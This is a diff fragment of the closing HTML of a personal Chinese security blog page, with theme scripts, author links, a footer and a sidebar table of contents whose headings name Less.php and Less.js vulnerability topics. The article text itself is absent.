+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-php%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">Less.php漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="nav-number">2.0.1.</span> <span class="nav-text">环境安装:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">2.0.2.</span> <span class="nav-text">任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#data-uri"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">data-uri</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#import"><span class="nav-number">2.0.2.2.</span> <span class="nav-text">@import</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF"><span class="nav-number">2.0.3.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#import-2"><span class="nav-number">2.0.3.1.</span> <span class="nav-text">@import</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.0.4.</span> <span class="nav-text">phar反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#data-uri-2"><span class="nav-number">2.0.4.1.</span> <span class="nav-text">data-uri</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E9%83%A8%E5%86%99%E5%85%A5"><span class="nav-number">2.0.5.</span> <span class="nav-text">文件头部写入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#import-3"><span class="nav-number">2.0.5.1.</span> <span class="nav-text">@import</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">2.0.6.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-js%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.</span> <span class="nav-text">Less.js漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85-2"><span class="nav-number">2.1.1.</span> <span class="nav-text">环境安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8BRCE"><span class="nav-number">2.1.2.</span> <span class="nav-text">远程RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-2"><span class="nav-number">2.1.3.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF-2"><span class="nav-number">2.1.4.</span> <span class="nav-text">SSRF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%E5%AE%9E%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.2.</span> <span class="nav-text">真实示例</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">LtmThink</p>
+  <div class="site-description" itemprop="description">LtmThink的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/LtmThink" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;LtmThink" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ltmthink1793@gmail.com" title="E-Mail → mailto:ltmthink1793@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LtmThink</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
